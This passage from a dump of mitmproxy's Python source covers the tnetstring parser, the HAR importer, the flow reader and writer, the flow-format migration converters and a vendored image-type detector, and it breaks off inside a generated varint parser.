pop(data)\n            lst.append(item)  # type: ignore\n        return lst\n    if data_type == ord(b\"}\"):\n        d = {}\n        while data:\n            key, data = pop(data)\n            val, data = pop(data)\n            d[key] = val  # type: ignore\n        return d\n    raise ValueError(f\"unknown type tag: {data_type}\")\n\n\ndef pop(data: bytes) -> tuple[TSerializable, bytes]:\n    \"\"\"\n    This function parses a tnetstring into a python object.\n    It returns a tuple giving the parsed object and a string\n    containing any unparsed data from the end of the string.\n    \"\"\"\n    #  Parse out data length, type and remaining string.\n    try:\n        blength, data = data.split(b\":\", 1)\n        length = int(blength)\n    except ValueError:\n        raise ValueError(\n            f\"not a tnetstring: missing or invalid length prefix: {data!r}\"\n        )\n    try:\n        data, data_type, remain = data[:length], data[length], data[length + 1 :]\n    except IndexError:\n        #  This fires if len(data) < dlen, meaning we don't need\n        #  to further validate that data is the right length.\n        raise ValueError(f\"not a tnetstring: invalid length prefix: {length}\")\n    # Parse the data based on the type tag.\n    return parse(data_type, data), remain\n\n\n__all__ = [\"dump\", \"dumps\", \"load\", \"loads\", \"pop\"]\n", "mitmproxy/io/har.py": "\"\"\"Reads HAR files into flow objects\"\"\"\n\nimport base64\nimport logging\nimport time\nfrom datetime import datetime\n\nfrom mitmproxy import connection\nfrom mitmproxy import exceptions\nfrom mitmproxy import http\nfrom mitmproxy.net.http.headers import infer_content_encoding\n\nlogger = logging.getLogger(__name__)\n\n\ndef fix_headers(\n    request_headers: list[dict[str, str]] | list[tuple[str, str]],\n) -> http.Headers:\n    \"\"\"Converts provided headers into (b\"header-name\", b\"header-value\") tuples\"\"\"\n    flow_headers: list[tuple[bytes, bytes]] = []\n    for header in request_headers:\n        # Applications that use the {\"name\":item,\"value\":item} notation are Brave,Chrome,Edge,Firefox,Charles,Fiddler,Insomnia,Safari\n        if isinstance(header, dict):\n            key = header[\"name\"]\n            value = header[\"value\"]\n\n        # Application that uses the [name, value] notation is Slack\n\n        else:\n            try:\n                key = header[0]\n                value = header[1]\n            except IndexError as e:\n                raise exceptions.OptionsError(str(e)) from e\n        flow_headers.append((key.encode(), value.encode()))\n\n    return http.Headers(flow_headers)\n\n\ndef request_to_flow(request_json: dict) -> http.HTTPFlow:\n    \"\"\"\n    Creates a HTTPFlow object from a given entry in HAR file\n    \"\"\"\n\n    timestamp_start = datetime.fromisoformat(\n        request_json[\"startedDateTime\"].replace(\"Z\", \"+00:00\")\n    ).timestamp()\n    timestamp_end = timestamp_start + request_json[\"time\"]\n    request_method = request_json[\"request\"][\"method\"]\n    request_url = request_json[\"request\"][\"url\"]\n    server_address = request_json.get(\"serverIPAddress\", None)\n    request_headers = fix_headers(request_json[\"request\"][\"headers\"])\n\n    http_version_req = request_json[\"request\"][\"httpVersion\"]\n    http_version_resp = request_json[\"response\"][\"httpVersion\"]\n\n    request_content = \"\"\n    # List contains all the representations of an http request across different HAR files\n    if request_url.startswith(\"http://\"):\n        port = 80\n    else:\n        port = 443\n\n    client_conn = connection.Client(\n        peername=(\"127.0.0.1\", 0),\n        sockname=(\"127.0.0.1\", 0),\n        # TODO Get time info from HAR File\n        timestamp_start=time.time(),\n    )\n\n    if server_address:\n        server_conn = connection.Server(address=(server_address, port))\n    else:\n        server_conn = connection.Server(address=None)\n\n    new_flow = http.HTTPFlow(client_conn, server_conn)\n\n    if \"postData\" in request_json[\"request\"]:\n        request_content = request_json[\"request\"][\"postData\"][\"text\"]\n\n    new_flow.request = http.Request.make(\n        request_method, request_url, request_content, request_headers\n    )\n\n    response_code = request_json[\"response\"][\"status\"]\n\n    # In Firefox HAR files images don't include response bodies\n    response_content = request_json[\"response\"][\"content\"].get(\"text\", \"\")\n    content_encoding = request_json[\"response\"][\"content\"].get(\"encoding\", None)\n    response_headers = fix_headers(request_json[\"response\"][\"headers\"])\n\n    if content_encoding == \"base64\":\n        response_content = base64.b64decode(response_content)\n    elif isinstance(response_content, str):\n        # Convert text to bytes, as in `Response.set_text`\n        try:\n            response_content = http.encoding.encode(\n                response_content,\n                (\n                    content_encoding\n                    or infer_content_encoding(response_headers.get(\"content-type\", \"\"))\n                ),\n            )\n        except ValueError:\n            # Fallback to UTF-8\n            response_content = response_content.encode(\n                \"utf-8\", errors=\"surrogateescape\"\n            )\n\n    # Then encode the content, as in `Response.set_content`\n    response_content = http.encoding.encode(\n        response_content, response_headers.get(\"content-encoding\") or \"identity\"\n    )\n\n    new_flow.response = http.Response(\n        b\"HTTP/1.1\",\n        response_code,\n        http.status_codes.RESPONSES.get(response_code, \"\").encode(),\n        response_headers,\n        response_content,\n        None,\n        timestamp_start,\n        timestamp_end,\n    )\n\n    # Update timestamps\n\n    new_flow.request.timestamp_start = timestamp_start\n    new_flow.request.timestamp_end = timestamp_end\n\n    new_flow.client_conn.timestamp_start = timestamp_start\n    new_flow.client_conn.timestamp_end = timestamp_end\n\n    # Update HTTP version\n\n    match http_version_req:\n        case \"http/2.0\":\n            new_flow.request.http_version = \"HTTP/2\"\n        case \"HTTP/2\":\n            new_flow.request.http_version = \"HTTP/2\"\n        case \"HTTP/3\":\n            new_flow.request.http_version = \"HTTP/3\"\n        case _:\n            new_flow.request.http_version = \"HTTP/1.1\"\n    match http_version_resp:\n        case \"http/2.0\":\n            new_flow.response.http_version = \"HTTP/2\"\n        case \"HTTP/2\":\n            new_flow.response.http_version = \"HTTP/2\"\n        case \"HTTP/3\":\n            new_flow.response.http_version = \"HTTP/3\"\n        case _:\n            new_flow.response.http_version = \"HTTP/1.1\"\n\n    return new_flow\n", "mitmproxy/io/io.py": "import json\nimport os\nfrom collections.abc import Iterable\nfrom io import BufferedReader\nfrom typing import Any\nfrom typing import BinaryIO\nfrom typing import cast\nfrom typing import Union\n\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import flowfilter\nfrom mitmproxy.io import compat\nfrom mitmproxy.io import tnetstring\nfrom mitmproxy.io.har import request_to_flow\n\n\nclass FlowWriter:\n    def __init__(self, fo):\n        self.fo = fo\n\n    def add(self, f: flow.Flow) -> None:\n        d = f.get_state()\n        tnetstring.dump(d, self.fo)\n\n\nclass FlowReader:\n    fo: BinaryIO\n\n    def __init__(self, fo: BinaryIO):\n        self.fo = fo\n\n    def peek(self, n: int) -> bytes:\n        try:\n            return cast(BufferedReader, self.fo).peek(n)\n        except AttributeError:\n            # https://github.com/python/cpython/issues/90533: io.BytesIO does not have peek()\n            pos = self.fo.tell()\n            ret = self.fo.read(n)\n            self.fo.seek(pos)\n            return ret\n\n    def stream(self) -> Iterable[flow.Flow]:\n        \"\"\"\n        Yields Flow objects from the dump.\n        \"\"\"\n\n        if self.peek(1).startswith(b\"{\"):\n            try:\n                har_file = json.loads(self.fo.read().decode(\"utf-8\"))\n\n                for request_json in har_file[\"log\"][\"entries\"]:\n                    yield request_to_flow(request_json)\n\n            except Exception:\n                raise exceptions.FlowReadException(\n                    \"Unable to read HAR file. Please provide a valid HAR file\"\n                )\n\n        else:\n            try:\n                while True:\n                    # FIXME: This cast hides a lack of dynamic type checking\n                    loaded = cast(\n                        dict[Union[bytes, str], Any],\n                        tnetstring.load(self.fo),\n                    )\n                    try:\n                        yield flow.Flow.from_state(compat.migrate_flow(loaded))\n                    except ValueError as e:\n                        raise exceptions.FlowReadException(e) from e\n            except (ValueError, TypeError, IndexError) as e:\n                if str(e) == \"not a tnetstring: empty file\":\n                    return  # Error is due to EOF\n                raise exceptions.FlowReadException(\"Invalid data format.\") from e\n\n\nclass FilteredFlowWriter:\n    def __init__(self, fo, flt):\n        self.fo = fo\n        self.flt = flt\n\n    def add(self, f: flow.Flow) -> None:\n        if self.flt and not flowfilter.match(self.flt, f):\n            return\n        d = f.get_state()\n        tnetstring.dump(d, self.fo)\n\n\ndef read_flows_from_paths(paths) -> list[flow.Flow]:\n    \"\"\"\n    Given a list of filepaths, read all flows and return a list of them.\n    From a performance perspective, streaming would be advisable -\n    however, if there's an error with one of the files, we want it to be raised immediately.\n\n    Raises:\n        FlowReadException, if any error occurs.\n    \"\"\"\n    try:\n        flows: list[flow.Flow] = []\n        for path in paths:\n            path = os.path.expanduser(path)\n            with open(path, \"rb\") as f:\n                flows.extend(FlowReader(f).stream())\n    except OSError as e:\n        raise exceptions.FlowReadException(e.strerror)\n    return flows\n", "mitmproxy/io/__init__.py": "from .io import FilteredFlowWriter\nfrom .io import FlowReader\nfrom .io import FlowWriter\nfrom .io import read_flows_from_paths\n\n__all__ = [\"FlowWriter\", \"FlowReader\", \"FilteredFlowWriter\", \"read_flows_from_paths\"]\n", "mitmproxy/io/compat.py": "\"\"\"\nThis module handles the import of mitmproxy flows generated by old versions.\n\nThe flow file version is decoupled from the mitmproxy release cycle (since\nv3.0.0dev) and versioning. Every change or migration gets a new flow file\nversion number, this prevents issues with developer builds and snapshots.\n\"\"\"\n\nimport copy\nimport uuid\nfrom typing import Any\n\nfrom mitmproxy import version\nfrom mitmproxy.utils import strutils\n\n\ndef convert_011_012(data):\n    data[b\"version\"] = (0, 12)\n    return data\n\n\ndef convert_012_013(data):\n    data[b\"version\"] = (0, 13)\n    return data\n\n\ndef convert_013_014(data):\n    data[b\"request\"][b\"first_line_format\"] = data[b\"request\"].pop(b\"form_in\")\n    data[b\"request\"][b\"http_version\"] = (\n        b\"HTTP/\"\n        + \".\".join(str(x) for x in data[b\"request\"].pop(b\"httpversion\")).encode()\n    )\n    data[b\"response\"][b\"http_version\"] = (\n        b\"HTTP/\"\n        + \".\".join(str(x) for x in data[b\"response\"].pop(b\"httpversion\")).encode()\n    )\n    data[b\"response\"][b\"status_code\"] = data[b\"response\"].pop(b\"code\")\n    data[b\"response\"][b\"body\"] = data[b\"response\"].pop(b\"content\")\n    data[b\"server_conn\"].pop(b\"state\")\n    data[b\"server_conn\"][b\"via\"] = None\n    data[b\"version\"] = (0, 14)\n    return data\n\n\ndef convert_014_015(data):\n    data[b\"version\"] = (0, 15)\n    return data\n\n\ndef convert_015_016(data):\n    for m in (b\"request\", b\"response\"):\n        if b\"body\" in data[m]:\n            data[m][b\"content\"] = data[m].pop(b\"body\")\n    if b\"msg\" in data[b\"response\"]:\n        data[b\"response\"][b\"reason\"] = data[b\"response\"].pop(b\"msg\")\n    data[b\"request\"].pop(b\"form_out\", None)\n    data[b\"version\"] = (0, 16)\n    return data\n\n\ndef convert_016_017(data):\n    data[b\"server_conn\"][b\"peer_address\"] = None\n    data[b\"version\"] = (0, 17)\n    return data\n\n\ndef convert_017_018(data):\n    # convert_unicode needs to be called for every dual release and the first py3-only release\n    data = convert_unicode(data)\n\n    data[\"server_conn\"][\"ip_address\"] = data[\"server_conn\"].pop(\"peer_address\", None)\n    data[\"marked\"] = False\n    data[\"version\"] = (0, 18)\n    return data\n\n\ndef convert_018_019(data):\n    # convert_unicode needs to be called for every dual release and the first py3-only release\n    data = convert_unicode(data)\n\n    data[\"request\"].pop(\"stickyauth\", None)\n    data[\"request\"].pop(\"stickycookie\", None)\n    data[\"client_conn\"][\"sni\"] = None\n    data[\"client_conn\"][\"alpn_proto_negotiated\"] = None\n    data[\"client_conn\"][\"cipher_name\"] = None\n    data[\"client_conn\"][\"tls_version\"] = None\n    data[\"server_conn\"][\"alpn_proto_negotiated\"] = None\n    if data[\"server_conn\"][\"via\"]:\n        data[\"server_conn\"][\"via\"][\"alpn_proto_negotiated\"] = None\n    data[\"mode\"] = \"regular\"\n    data[\"metadata\"] = dict()\n    data[\"version\"] = (0, 19)\n    return data\n\n\ndef convert_019_100(data):\n    # convert_unicode needs to be called for every dual release and the first py3-only release\n    data = convert_unicode(data)\n\n    data[\"version\"] = (1, 0, 0)\n    return data\n\n\ndef convert_100_200(data):\n    data[\"version\"] = (2, 0, 0)\n    data[\"client_conn\"][\"address\"] = data[\"client_conn\"][\"address\"][\"address\"]\n    data[\"server_conn\"][\"address\"] = data[\"server_conn\"][\"address\"][\"address\"]\n    data[\"server_conn\"][\"source_address\"] = data[\"server_conn\"][\"source_address\"][\n        \"address\"\n    ]\n    if data[\"server_conn\"][\"ip_address\"]:\n        data[\"server_conn\"][\"ip_address\"] = data[\"server_conn\"][\"ip_address\"][\"address\"]\n\n    if data[\"server_conn\"][\"via\"]:\n        data[\"server_conn\"][\"via\"][\"address\"] = data[\"server_conn\"][\"via\"][\"address\"][\n            \"address\"\n        ]\n        data[\"server_conn\"][\"via\"][\"source_address\"] = data[\"server_conn\"][\"via\"][\n            \"source_address\"\n        ][\"address\"]\n        if data[\"server_conn\"][\"via\"][\"ip_address\"]:\n            data[\"server_conn\"][\"via\"][\"ip_address\"] = data[\"server_conn\"][\"via\"][\n                \"ip_address\"\n            ][\"address\"]\n\n    return data\n\n\ndef convert_200_300(data):\n    data[\"version\"] = (3, 0, 0)\n    data[\"client_conn\"][\"mitmcert\"] = None\n    data[\"server_conn\"][\"tls_version\"] = None\n    if data[\"server_conn\"][\"via\"]:\n        data[\"server_conn\"][\"via\"][\"tls_version\"] = None\n    return data\n\n\ndef convert_300_4(data):\n    data[\"version\"] = 4\n    # This is an empty migration to transition to the new versioning scheme.\n    return data\n\n\nclient_connections: dict[tuple[str, ...], str] = {}\nserver_connections: dict[tuple[str, ...], str] = {}\n\n\ndef convert_4_5(data):\n    data[\"version\"] = 5\n    client_conn_key = (\n        data[\"client_conn\"][\"timestamp_start\"],\n        *data[\"client_conn\"][\"address\"],\n    )\n    server_conn_key = (\n        data[\"server_conn\"][\"timestamp_start\"],\n        *data[\"server_conn\"][\"source_address\"],\n    )\n    data[\"client_conn\"][\"id\"] = client_connections.setdefault(\n        client_conn_key, str(uuid.uuid4())\n    )\n    data[\"server_conn\"][\"id\"] = server_connections.setdefault(\n        server_conn_key, str(uuid.uuid4())\n    )\n\n    if data[\"server_conn\"][\"via\"]:\n        server_conn_key = (\n            data[\"server_conn\"][\"via\"][\"timestamp_start\"],\n            *data[\"server_conn\"][\"via\"][\"source_address\"],\n        )\n        data[\"server_conn\"][\"via\"][\"id\"] = server_connections.setdefault(\n            server_conn_key, str(uuid.uuid4())\n        )\n\n    return data\n\n\ndef convert_5_6(data):\n    data[\"version\"] = 6\n    data[\"client_conn\"][\"tls_established\"] = data[\"client_conn\"].pop(\"ssl_established\")\n    data[\"client_conn\"][\"timestamp_tls_setup\"] = data[\"client_conn\"].pop(\n        \"timestamp_ssl_setup\"\n    )\n    data[\"server_conn\"][\"tls_established\"] = data[\"server_conn\"].pop(\"ssl_established\")\n    data[\"server_conn\"][\"timestamp_tls_setup\"] = data[\"server_conn\"].pop(\n        \"timestamp_ssl_setup\"\n    )\n    if data[\"server_conn\"][\"via\"]:\n        data[\"server_conn\"][\"via\"][\"tls_established\"] = data[\"server_conn\"][\"via\"].pop(\n            \"ssl_established\"\n        )\n        data[\"server_conn\"][\"via\"][\"timestamp_tls_setup\"] = data[\"server_conn\"][\n            \"via\"\n        ].pop(\"timestamp_ssl_setup\")\n    return data\n\n\ndef convert_6_7(data):\n    data[\"version\"] = 7\n    data[\"client_conn\"][\"tls_extensions\"] = None\n    return data\n\n\ndef convert_7_8(data):\n    data[\"version\"] = 8\n    if \"request\" in data and data[\"request\"] is not None:\n        data[\"request\"][\"trailers\"] = None\n    if \"response\" in data and data[\"response\"] is not None:\n        data[\"response\"][\"trailers\"] = None\n    return data\n\n\ndef convert_8_9(data):\n    data[\"version\"] = 9\n    is_request_replay = False\n    if \"request\" in data:\n        data[\"request\"].pop(\"first_line_format\")\n        data[\"request\"][\"authority\"] = b\"\"\n        is_request_replay = data[\"request\"].pop(\"is_replay\", False)\n    is_response_replay = False\n    if \"response\" in data and data[\"response\"] is not None:\n        is_response_replay = data[\"response\"].pop(\"is_replay\", False)\n    if is_request_replay:  # pragma: no cover\n        data[\"is_replay\"] = \"request\"\n    elif is_response_replay:  # pragma: no cover\n        data[\"is_replay\"] = \"response\"\n    else:\n        data[\"is_replay\"] = None\n    return data\n\n\ndef convert_9_10(data):\n    data[\"version\"] = 10\n\n    def conv_conn(conn):\n        conn[\"state\"] = 0\n        conn[\"error\"] = None\n        conn[\"tls\"] = conn[\"tls_established\"]\n        alpn = conn[\"alpn_proto_negotiated\"]\n        conn[\"alpn_offers\"] = [alpn] if alpn else None\n        cipher = conn[\"cipher_name\"]\n        conn[\"cipher_list\"] = [cipher] if cipher else None\n\n    def conv_cconn(conn):\n        conn[\"sockname\"] = (\"\", 0)\n        cc = conn.pop(\"clientcert\", None)\n        conn[\"certificate_list\"] = [cc] if cc else []\n        conv_conn(conn)\n\n    def conv_sconn(conn):\n        crt = conn.pop(\"cert\", None)\n        conn[\"certificate_list\"] = [crt] if crt else []\n        conn[\"cipher_name\"] = None\n        conn[\"via2\"] = None\n        conv_conn(conn)\n\n    conv_cconn(data[\"client_conn\"])\n    conv_sconn(data[\"server_conn\"])\n    if data[\"server_conn\"][\"via\"]:\n        conv_sconn(data[\"server_conn\"][\"via\"])\n\n    return data\n\n\ndef convert_10_11(data):\n    data[\"version\"] = 11\n\n    def conv_conn(conn):\n        conn[\"sni\"] = strutils.always_str(conn[\"sni\"], \"ascii\", \"backslashreplace\")\n        conn[\"alpn\"] = conn.pop(\"alpn_proto_negotiated\")\n        conn[\"alpn_offers\"] = conn[\"alpn_offers\"] or []\n        conn[\"cipher_list\"] = conn[\"cipher_list\"] or []\n\n    conv_conn(data[\"client_conn\"])\n    conv_conn(data[\"server_conn\"])\n    if data[\"server_conn\"][\"via\"]:\n        conv_conn(data[\"server_conn\"][\"via\"])\n\n    return data\n\n\n_websocket_handshakes = {}\n\n\ndef convert_11_12(data):\n    data[\"version\"] = 12\n\n    if \"websocket\" in data[\"metadata\"]:\n        _websocket_handshakes[data[\"id\"]] = copy.deepcopy(data)\n\n    if \"websocket_handshake\" in data[\"metadata\"]:\n        ws_flow = data\n        try:\n            data = _websocket_handshakes.pop(data[\"metadata\"][\"websocket_handshake\"])\n        except KeyError:\n            # The handshake flow is missing, which should never really happen. We make up a dummy.\n            data = {\n                \"client_conn\": data[\"client_conn\"],\n                \"error\": data[\"error\"],\n                \"id\": data[\"id\"],\n                \"intercepted\": data[\"intercepted\"],\n                \"is_replay\": data[\"is_replay\"],\n                \"marked\": data[\"marked\"],\n                \"metadata\": {},\n                \"mode\": \"transparent\",\n                \"request\": {\n                    \"authority\": b\"\",\n                    \"content\": None,\n                    \"headers\": [],\n                    \"host\": b\"unknown\",\n                    \"http_version\": b\"HTTP/1.1\",\n                    \"method\": b\"GET\",\n                    \"path\": b\"/\",\n                    \"port\": 80,\n                    \"scheme\": b\"http\",\n                    \"timestamp_end\": 0,\n                    \"timestamp_start\": 0,\n                    \"trailers\": None,\n                },\n                \"response\": None,\n                \"server_conn\": data[\"server_conn\"],\n                \"type\": \"http\",\n                \"version\": 12,\n            }\n        data[\"metadata\"][\"duplicated\"] = (\n            \"This WebSocket flow has been migrated from an old file format version \"\n            \"and may appear duplicated.\"\n        )\n        data[\"websocket\"] = {\n            \"messages\": ws_flow[\"messages\"],\n            \"closed_by_client\": ws_flow[\"close_sender\"] == \"client\",\n            \"close_code\": ws_flow[\"close_code\"],\n            \"close_reason\": ws_flow[\"close_reason\"],\n            \"timestamp_end\": data.get(\"server_conn\", {}).get(\"timestamp_end\", None),\n        }\n\n    else:\n        data[\"websocket\"] = None\n\n    return data\n\n\ndef convert_12_13(data):\n    data[\"version\"] = 13\n    if data[\"marked\"]:\n        data[\"marked\"] = \":default:\"\n    else:\n        data[\"marked\"] = \"\"\n    return data\n\n\ndef convert_13_14(data):\n    data[\"version\"] = 14\n    data[\"comment\"] = \"\"\n    # bugfix for https://github.com/mitmproxy/mitmproxy/issues/4576\n    if data.get(\"response\", None) and data[\"response\"][\"timestamp_start\"] is None:\n        data[\"response\"][\"timestamp_start\"] = data[\"request\"][\"timestamp_end\"]\n        data[\"response\"][\"timestamp_end\"] = data[\"request\"][\"timestamp_end\"] + 1\n    return data\n\n\ndef convert_14_15(data):\n    data[\"version\"] = 15\n    if data.get(\"websocket\", None):\n        # Add \"injected\" attribute.\n        data[\"websocket\"][\"messages\"] = [\n            msg + [False] for msg in data[\"websocket\"][\"messages\"]\n        ]\n    return data\n\n\ndef convert_15_16(data):\n    data[\"version\"] = 16\n    data[\"timestamp_created\"] = data.get(\"request\", data[\"client_conn\"])[\n        \"timestamp_start\"\n    ]\n    return data\n\n\ndef convert_16_17(data):\n    data[\"version\"] = 17\n    data.pop(\"mode\", None)\n    return data\n\n\ndef convert_17_18(data):\n    data[\"version\"] = 18\n    data[\"client_conn\"][\"proxy_mode\"] = \"regular\"\n    return data\n\n\ndef convert_18_19(data):\n    data[\"version\"] = 19\n    data[\"client_conn\"][\"peername\"] = data[\"client_conn\"].pop(\"address\", None)\n    if data[\"client_conn\"].get(\"timestamp_start\") is None:\n        data[\"client_conn\"][\"timestamp_start\"] = 0.0\n    data[\"client_conn\"].pop(\"tls_extensions\")\n\n    data[\"server_conn\"][\"peername\"] = data[\"server_conn\"].pop(\"ip_address\", None)\n    data[\"server_conn\"][\"sockname\"] = data[\"server_conn\"].pop(\"source_address\", None)\n    data[\"server_conn\"][\"via\"] = data[\"server_conn\"].pop(\"via2\", None)\n\n    for conn in [\"client_conn\", \"server_conn\"]:\n        data[conn].pop(\"tls_established\")\n\n        data[conn][\"cipher\"] = data[conn].pop(\"cipher_name\", None)\n        data[conn].setdefault(\"transport_protocol\", \"tcp\")\n\n        for name in [\"peername\", \"sockname\", \"address\"]:\n            if data[conn].get(name) and isinstance(data[conn][name][0], bytes):\n                data[conn][name][0] = data[conn][name][0].decode(\n                    errors=\"backslashreplace\"\n                )\n\n    if data[\"server_conn\"][\"sni\"] is True:\n        data[\"server_conn\"][\"sni\"] = data[\"server_conn\"][\"address\"][0]\n\n    return data\n\n\ndef convert_19_20(data):\n    data[\"version\"] = 20\n    data[\"client_conn\"].pop(\"state\", None)\n    data[\"server_conn\"].pop(\"state\", None)\n    return data\n\n\ndef _convert_dict_keys(o: Any) -> Any:\n    if isinstance(o, dict):\n        return {strutils.always_str(k): _convert_dict_keys(v) for k, v in o.items()}\n    else:\n        return o\n\n\ndef _convert_dict_vals(o: dict, values_to_convert: dict) -> dict:\n    for k, v in values_to_convert.items():\n        if not o or k not in o:\n            continue  # pragma: no cover\n        if v is True:\n            o[k] = strutils.always_str(o[k])\n        else:\n            _convert_dict_vals(o[k], v)\n    return o\n\n\ndef convert_unicode(data: dict) -> dict:\n    \"\"\"\n    This method converts between Python 3 and Python 2 dumpfiles.\n    \"\"\"\n    data = _convert_dict_keys(data)\n    data = _convert_dict_vals(\n        data,\n        {\n            \"type\": True,\n            \"id\": True,\n            \"request\": {\"first_line_format\": True},\n            \"error\": {\"msg\": True},\n        },\n    )\n    return data\n\n\nconverters = {\n    (0, 11): convert_011_012,\n    (0, 12): convert_012_013,\n    (0, 13): convert_013_014,\n    (0, 14): convert_014_015,\n    (0, 15): convert_015_016,\n    (0, 16): convert_016_017,\n    (0, 17): convert_017_018,\n    (0, 18): convert_018_019,\n    (0, 19): convert_019_100,\n    (1, 0): convert_100_200,\n    (2, 0): convert_200_300,\n    (3, 0): convert_300_4,\n    4: convert_4_5,\n    5: convert_5_6,\n    6: convert_6_7,\n    7: convert_7_8,\n    8: convert_8_9,\n    9: convert_9_10,\n    10: convert_10_11,\n    11: convert_11_12,\n    12: convert_12_13,\n    13: convert_13_14,\n    14: convert_14_15,\n    15: convert_15_16,\n    16: convert_16_17,\n    17: convert_17_18,\n    18: convert_18_19,\n    19: convert_19_20,\n}\n\n\ndef migrate_flow(flow_data: dict[bytes | str, Any]) -> dict[bytes | str, Any]:\n    while True:\n        flow_version = flow_data.get(b\"version\", flow_data.get(\"version\"))\n\n        # Historically, we used the mitmproxy minor version tuple as the flow format version.\n        if not isinstance(flow_version, int):\n            flow_version = tuple(flow_version)[:2]\n\n        if flow_version == version.FLOW_FORMAT_VERSION:\n            break\n        elif flow_version in converters:\n            flow_data = converters[flow_version](flow_data)\n        else:\n            should_upgrade = (\n                isinstance(flow_version, int)\n                and flow_version > version.FLOW_FORMAT_VERSION\n            )\n            raise ValueError(\n                \"{} cannot read files with flow format version {}{}.\".format(\n                    version.MITMPROXY,\n                    flow_version,\n                    \", please update mitmproxy\" if should_upgrade else \"\",\n                )\n            )\n    return flow_data\n", "mitmproxy/contrib/imghdr.py": "# A vendored copy of Python's imghdr module, which is slated for removal in Python 3.13.\n#\n# Source: https://github.com/python/cpython/blob/3.12/Lib/imghdr.py\n# SPDX-License-Identifier: PSF-2.0\n\n\"\"\"Recognize image file formats based on their first few bytes.\"\"\"\n\nfrom os import PathLike\nimport warnings\n\n__all__ = [\"what\"]\n\n\n# warnings._deprecated(__name__, remove=(3, 13))\n\n\n#-------------------------#\n# Recognize image headers #\n#-------------------------#\n\ndef what(file, h=None):\n    \"\"\"Return the type of image contained in a file or byte stream.\"\"\"\n    f = None\n    try:\n        if h is None:\n            if isinstance(file, (str, PathLike)):\n                f = open(file, 'rb')\n                h = f.read(32)\n            else:\n                location = file.tell()\n                h = file.read(32)\n                file.seek(location)\n        for tf in tests:\n            res = tf(h, f)\n            if res:\n                return res\n    finally:\n        if f: f.close()\n    return None\n\n\n#---------------------------------#\n# Subroutines per image file type #\n#---------------------------------#\n\ntests = []\n\ndef test_jpeg(h, f):\n    \"\"\"Test for JPEG data with JFIF or Exif markers; and raw JPEG.\"\"\"\n    if h[6:10] in (b'JFIF', b'Exif'):\n        return 'jpeg'\n    elif h[:4] == b'\\xff\\xd8\\xff\\xdb':\n        return 'jpeg'\n\ntests.append(test_jpeg)\n\ndef test_png(h, f):\n    \"\"\"Verify if the image is a PNG.\"\"\"\n    if h.startswith(b'\\211PNG\\r\\n\\032\\n'):\n        return 'png'\n\ntests.append(test_png)\n\ndef test_gif(h, f):\n    \"\"\"Verify if the image is a GIF ('87 or '89 variants).\"\"\"\n    if h[:6] in (b'GIF87a', b'GIF89a'):\n        return 'gif'\n\ntests.append(test_gif)\n\ndef test_tiff(h, f):\n    \"\"\"Verify if the image is a TIFF (can be in Motorola or Intel byte order).\"\"\"\n    if h[:2] in (b'MM', b'II'):\n        return 'tiff'\n\ntests.append(test_tiff)\n\ndef test_rgb(h, f):\n    \"\"\"test for the SGI image library.\"\"\"\n    if h.startswith(b'\\001\\332'):\n        return 'rgb'\n\ntests.append(test_rgb)\n\ndef test_pbm(h, f):\n    \"\"\"Verify if the image is a PBM (portable bitmap).\"\"\"\n    if len(h) >= 3 and \\\n        h[0] == ord(b'P') and h[1] in b'14' and h[2] in b' \\t\\n\\r':\n        return 'pbm'\n\ntests.append(test_pbm)\n\ndef test_pgm(h, f):\n    \"\"\"Verify if the image is a PGM (portable graymap).\"\"\"\n    if len(h) >= 3 and \\\n        h[0] == ord(b'P') and h[1] in b'25' and h[2] in b' \\t\\n\\r':\n        return 'pgm'\n\ntests.append(test_pgm)\n\ndef test_ppm(h, f):\n    \"\"\"Verify if the image is a PPM (portable pixmap).\"\"\"\n    if len(h) >= 3 and \\\n        h[0] == ord(b'P') and h[1] in b'36' and h[2] in b' \\t\\n\\r':\n        return 'ppm'\n\ntests.append(test_ppm)\n\ndef test_rast(h, f):\n    \"\"\"test for the Sun raster file.\"\"\"\n    if h.startswith(b'\\x59\\xA6\\x6A\\x95'):\n        return 'rast'\n\ntests.append(test_rast)\n\ndef test_xbm(h, f):\n    \"\"\"Verify if the image is a X bitmap (X10 or X11).\"\"\"\n    if h.startswith(b'#define '):\n        return 'xbm'\n\ntests.append(test_xbm)\n\ndef test_bmp(h, f):\n    \"\"\"Verify if the image is a BMP file.\"\"\"\n    if h.startswith(b'BM'):\n        return 'bmp'\n\ntests.append(test_bmp)\n\ndef test_webp(h, f):\n    \"\"\"Verify if the image is a WebP.\"\"\"\n    if h.startswith(b'RIFF') and h[8:12] == b'WEBP':\n        return 'webp'\n\ntests.append(test_webp)\n\ndef test_exr(h, f):\n    \"\"\"verify is the image ia a OpenEXR fileOpenEXR.\"\"\"\n    if h.startswith(b'\\x76\\x2f\\x31\\x01'):\n        return 'exr'\n\ntests.append(test_exr)\n", "mitmproxy/contrib/__init__.py": "", "mitmproxy/contrib/kaitaistruct/vlq_base128_le.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStruct\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nclass VlqBase128Le(KaitaiStruct):\n    \"\"\"A variable-length unsigned/signed integer using base128 encoding. 1-byte groups\n    consist of 1-bit flag of continuation and 7-bit value chunk, and are ordered\n    \"least significant group first\", i.e. in \"little-endian\" manner.\n    \n    This particular encoding is specified and used in:\n    \n    * DWARF debug file format, where it's dubbed \"unsigned LEB128\" or \"ULEB128\".\n      http://dwarfstd.org/doc/dwarf-2.0.0.pdf - page 139\n    * Google Protocol Buffers, where it's called \"Base 128 Varints\".\n      https://developers.google.com/protocol-buffers/docs/encoding?csw=1#varints\n    * Apache Lucene, where it's called \"VInt\"\n      https://lucene.apache.org/core/3_5_0/fileformats.html#VInt\n    * Apache Avro uses this as a basis for integer encoding, adding ZigZag on\n      top of it for signed ints\n      https://avro.apache.org/docs/current/spec.html#binary_encode_primitive\n    \n    More information on this encoding is available at https://en.wikipedia.org/wiki/LEB128\n    \n    This particular implementation supports serialized values to up 8 bytes long.\n    \"\"\"\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.groups = []\n        i = 0\n        while True:\n            _ = VlqBase128Le.Group(self._io, self, self._root)\n            self.groups.append(_)\n            if not (_.has_next):\n                break\n            i += 1\n\n  